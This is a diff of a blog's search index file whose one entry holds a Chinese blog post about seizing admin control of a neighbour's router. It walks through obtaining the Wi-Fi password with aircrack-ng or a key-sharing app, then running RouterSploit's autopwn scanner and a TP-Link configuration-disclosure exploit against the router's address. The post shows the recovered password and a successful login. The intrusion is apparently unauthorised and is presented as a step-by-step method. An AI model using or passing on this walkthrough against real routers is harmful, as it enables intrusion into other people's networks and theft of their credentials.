@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title><![CDATA[RouterSploit]]></title>
+    <title><![CDATA[一次获取邻居路由器的管理权限]]></title>
     <url>%2F2017%2F10%2F08%2FRouterSploit%2F</url>
     <content type="text"><![CDATA[如题 一次获取邻居路由器的管理权限首先要获得密码，连接上对方的wifi，可以用wifi万能钥匙，或者aircrack-ng获取，具体过程不再述说 打开kali，安装routersploit工具： 1git clone https://github.com/reverse-shell/routersploit 安装完成后，进入安装目录下： 1./rsf.py 成功启动会有如下界面： 进行一些配置 123456先加载自动扫描模块：use scanners/autopwn设置目标路由器IP：set target 192.168.168.1进行扫描：exploit 截图中我们可以看到，有两个存在的漏洞 先加载第一个漏洞尝试一下 12345use exploits/routers/zyxel/zywall_usg_extract_hashes设置目标：set target 192.168.168.1检查是否可利用：check 结果是不能利用 再加载第二个利用模块： 12345use exploits/routers/tplink/wdr842nd_wdr842n_configure_disclosure设置目标：set target 192.168.168.1检查是否可利用：check 显示可以利用，我们进行攻击 1exploit OK，成功得到目标路由器的登录密码在浏览器中输入192.168.168.1，输入登录密码：654321成功登陆：]]></content>
       <categories>
